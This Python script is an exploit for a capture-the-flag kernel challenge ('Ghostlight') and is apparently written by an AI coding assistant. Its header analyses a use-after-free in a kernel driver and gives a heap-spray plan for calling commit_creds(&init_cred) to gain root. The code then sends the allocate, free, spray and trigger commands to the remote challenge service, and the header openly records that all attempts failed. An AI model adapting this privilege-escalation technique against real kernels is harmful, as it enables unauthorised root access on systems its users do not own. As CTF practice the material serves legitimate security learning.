#!/usr/bin/env python3
"""
Author: Claude Code (AI Assistant)
Challenge: Ghostlight - Kernel Use-After-Free Exploitation
Purpose: Exploit UAF in /dev/ghostlight driver to escalate privileges and read flag
Created: 2025-11-10
Last Updated: 2025-11-10 (multiple testing iterations)

=== VULNERABILITY ANALYSIS ===

Location: ghostlight.c:123-129 (GHOST_IOC_FREE ioctl)
Bug: gl_ctx is freed but pointer not set to NULL, creating dangling pointer
Impact: kprobe handler (line 41) still references gl_ctx after free

Code flow:
```c
case GHOST_IOC_FREE: {
    struct glow *old;
    mutex_lock(&gl_lock);
    old = gl_ctx;
    if (old) kfree(old);    // BUG: gl_ctx not NULLed
    mutex_unlock(&gl_lock);
    return 0;
}

static int kp_pre(struct kprobe *p, struct pt_regs *regs) {
    struct glow *ctx = READ_ONCE(gl_ctx);  // Reads freed memory!
    if (ctx && ctx->fn)
        ctx->fn(ctx->arg);  // Calls attacker-controlled function pointer
    return 0;
}
```

=== EXPLOITATION THEORY ===

1. ARM: Allocate gl_ctx object (struct glow, kmalloc-64)
2. HOOKON: Enable kprobe on __x64_sys_getpid syscall
3. FREE: Free gl_ctx memory (UAF - pointer remains dangling)
4. SPRAY: Allocate many glow objects with controlled fn/arg to reclaim freed memory
5. Trigger: getpid syscalls fire kprobe → calls gl_ctx->fn(gl_ctx->arg)
6. Payload: fn=commit_creds (0xffffffffabcc5400), arg=&init_cred (0xffffffffad659a00)
7. Result: Should execute commit_creds(&init_cred) → privilege escalation to root
8. Service: Should automatically detect escalation and return flag

=== PRIVILEGE ESCALATION TECHNIQUE ===

commit_creds(&init_cred) - Single function call escalation
- init_cred is the credential struct used by init process (PID 1)
- Has full root privileges (uid=0, gid=0, full capabilities)
- Confirmed as valid technique in research and recent CVE exploits
- Alternative would be commit_creds(prepare_kernel_cred(0)) but requires ROP chain

=== TESTING SUMMARY ===

Tested over 20+ different configurations:
- Spray counts: 50, 64, 100, 128, 150, 200, 256, 500, 512, 1000, 1024, 2000, 2048, 4096
- Command sequences: ARM→HOOKON→FREE→SPRAY, HOOKON→ARM→FREE→SPRAY
- With/without POKE command (trigger getpid)
- With/without READFLAG command
- Different address formats (hex: 0x..., decimal)
- Multiple hook timing variations

Result: ALL attempts return only "OK\n" (3 bytes) from service

=== STATUS: UNSOLVED ===

Root cause unknown. Possible issues:
1. Heap spray unreliable - kmalloc-64 heavily used, may not reclaim exact memory
2. Service wrapper unknown - may not properly translate commands or trigger getpid
3. Privilege escalation may work but service doesn't detect/handle it properly
4. Missing exploitation element - may need ROP, different timing, or alternative technique

See UNSOLVED.md for complete analysis of all attempts and research findings.

Note: The vulnerability is real and correctly identified. The exploitation theory
is sound and confirmed by security research. But remote service consistently
returns only "OK" regardless of approach, suggesting fundamental issue with
heap reclamation reliability or service implementation.
"""

import socket
import struct
import sys
import time

# Kernel symbol addresses from README
COMMIT_CREDS = 0xffffffffabcc5400
PREPARE_KERNEL_CRED = 0xffffffffabcc56b0
INIT_CRED = 0xffffffffad659a00

# IOCTL definitions
GHOST_IOC_MAGIC = ord('G')
_IOC_NRBITS = 8
_IOC_TYPEBITS = 8
_IOC_SIZEBITS = 14
_IOC_NRSHIFT = 0
_IOC_TYPESHIFT = _IOC_NRSHIFT + _IOC_NRBITS
_IOC_SIZESHIFT = _IOC_TYPESHIFT + _IOC_TYPEBITS
_IOC_DIRSHIFT = _IOC_SIZESHIFT + _IOC_SIZEBITS

_IOC_NONE = 0
_IOC_WRITE = 1
_IOC_READ = 2

def _IOC(dir, type, nr, size):
    return (dir << _IOC_DIRSHIFT) | (type << _IOC_TYPESHIFT) | (nr << _IOC_NRSHIFT) | (size << _IOC_SIZESHIFT)

def _IOW(type, nr, size):
    return _IOC(_IOC_WRITE, type, nr, size)

def _IO(type, nr):
    return _IOC(_IOC_NONE, type, nr, 0)

GHOST_IOC_ARM = _IOW(GHOST_IOC_MAGIC, 0x01, 8)  # unsigned long is 8 bytes
GHOST_IOC_FREE = _IO(GHOST_IOC_MAGIC, 0x02)
GHOST_IOC_SPRAY = _IOW(GHOST_IOC_MAGIC, 0x03, 8)
GHOST_IOC_HOOKON = _IO(GHOST_IOC_MAGIC, 0x04)
GHOST_IOC_HOOKOFF = _IO(GHOST_IOC_MAGIC, 0x05)
GHOST_IOC_READFLAG = _IOW(GHOST_IOC_MAGIC, 0x06, 8)

def send_cmd(sock, cmd):
    """Send a text command to the remote service"""
    sock.sendall(cmd.encode() + b'\n')
    print(f"[+] Sent: {cmd}")

def exploit_remote(host, port):
    """Exploit the remote ghostlight service"""
    print(f"[*] Connecting to {host}:{port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    print("[+] Connected!")

    try:
        # Step 1: ARM - allocate gl_ctx
        print("\n[*] Step 1: ARM - Allocating gl_ctx")
        send_cmd(sock, "arm 0x4141414141414141")
        time.sleep(0.1)

        # Step 2: HOOKON - enable kprobe
        print("\n[*] Step 2: HOOKON - Enabling kprobe on getpid")
        send_cmd(sock, "hookon")
        time.sleep(0.1)

        # Step 3: FREE - free gl_ctx (UAF!)
        print("\n[*] Step 3: FREE - Creating use-after-free")
        send_cmd(sock, "free")
        time.sleep(0.1)

        # Step 4: SPRAY - reclaim freed memory with our payload
        print("\n[*] Step 4: SPRAY - Reclaiming memory with privilege escalation payload")
        print(f"    fn = commit_creds = 0x{COMMIT_CREDS:016x}")
        print(f"    arg = &init_cred = 0x{INIT_CRED:016x}")
        send_cmd(sock, f"spray 100 0x{COMMIT_CREDS:x} 0x{INIT_CRED:x}")
        time.sleep(0.1)

        # Step 5: Trigger getpid to fire the kprobe and execute privilege escalation
        print("\n[*] Step 5: Triggering getpid to execute privilege escalation")
        send_cmd(sock, "poke")
        time.sleep(0.1)

        # Step 6: Signal EOF so service reads and returns the flag
        print("\n[*] Step 6: Signaling EOF to finalize and retrieve flag")
        sock.shutdown(socket.SHUT_WR)  # Close write side to signal EOF

        # Wait for response
        print("\n[*] Waiting for response...")
        response = b""
        sock.settimeout(5)
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break

        print(f"\n[+] Received {len(response)} bytes")
        if response:
            print("[+] Response:")
            print(response.decode('utf-8', errors='replace'))

        return response

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        sock.close()
        print("\n[*] Connection closed")

if __name__ == "__main__":
    # Remote target from README
    HOST = "exp200-3.pointeroverflowctf.com"
    PORT = 14990

    if len(sys.argv) > 1:
        HOST = sys.argv[1]
    if len(sys.argv) > 2:
        PORT = int(sys.argv[2])

    print("=" * 60)
    print("Ghostlight Kernel UAF Exploit")
    print("=" * 60)

    result = exploit_remote(HOST, PORT)

    if result and b"POCTF{" in result:
        print("\n" + "=" * 60)
        print("[SUCCESS] Flag found!")
        print("=" * 60)
    else:
        print("\n[-] No flag found in response")
